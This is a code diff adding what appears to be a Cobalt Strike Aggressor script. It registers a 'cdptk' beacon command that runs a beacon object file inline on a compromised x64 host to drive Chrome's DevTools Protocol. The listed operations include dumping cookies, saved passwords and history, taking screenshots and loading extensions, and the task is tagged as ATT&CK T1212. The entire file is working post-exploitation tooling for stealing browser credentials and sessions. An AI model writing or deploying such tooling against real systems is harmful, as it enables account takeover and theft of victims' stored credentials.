@@ -1,0 +1,50 @@
+sub read_cdptk_bof {
+    local('$handle $data');
+    $handle = openf(script_resource("cdptk_bof.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+    return $data;
+}
+
+sub run_cdptk {
+    local('$bid $count $command $port $arg1 $arg2 $flags $data $packed');
+    $bid = $1;
+    $count = size(@_);
+    if ($count < 2 || $count > 6) {
+        berror($bid, "Usage: cdptk <command> [port] [arg1] [arg2] [flags]");
+        return;
+    }
+    if (barch($bid) ne "x64") {
+        berror($bid, "cdptk requires an x64 beacon");
+        return;
+    }
+    $command = lc($2);
+    $port = 9222;
+    $arg1 = "";
+    $arg2 = "";
+    $flags = 0;
+    if ($count >= 3) { $port = int($3); }
+    if ($count >= 4) { $arg1 = $4; }
+    if ($count >= 5) { $arg2 = $5; }
+    if ($count >= 6) { $flags = int($6); }
+    if ($port < 1 || $port > 65535) {
+        berror($bid, "port must be between 1 and 65535");
+        return;
+    }
+    $data = read_cdptk_bof();
+    if (strlen($data) == 0) {
+        berror($bid, "could not read cdptk_bof.o");
+        return;
+    }
+    $packed = bof_pack($bid, "zizzi", $command, $port, $arg1, $arg2, $flags);
+    btask($bid, "Tasked beacon to run CDP Toolkit BOF command $command", "T1212");
+    beacon_inline_execute($bid, $data, "go", $packed);
+}
+
+alias("cdptk", &run_cdptk);
+
+beacon_command_register(
+    "cdptk",
+    "Run one-shot Chrome DevTools Protocol operations.",
+    "Usage: cdptk <discover|tabs|screenshot|cookies|page-new|page-close|contexts|context-dispose|snapshot|extensions-load|bookmarks|history|saved-passwords|extensions> [port] [arg1] [arg2] [flags]"
+);
